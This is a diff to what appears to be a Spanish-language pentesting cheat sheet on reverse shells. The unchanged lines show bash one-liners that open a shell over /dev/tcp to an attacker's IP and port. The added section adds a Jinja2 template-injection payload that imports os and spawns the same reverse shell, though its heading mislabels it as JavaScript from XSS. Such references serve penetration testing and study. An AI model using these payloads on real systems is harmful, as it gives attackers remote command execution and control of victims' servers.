@@ -49,3 +49,9 @@ echo ‘bash -c “bash-i >& /dev/tcp/IP/PORT 0>&1”’ | bash
 
 sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
+
+## Con JavaScript desde un XSS
+
+```bash
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
+```
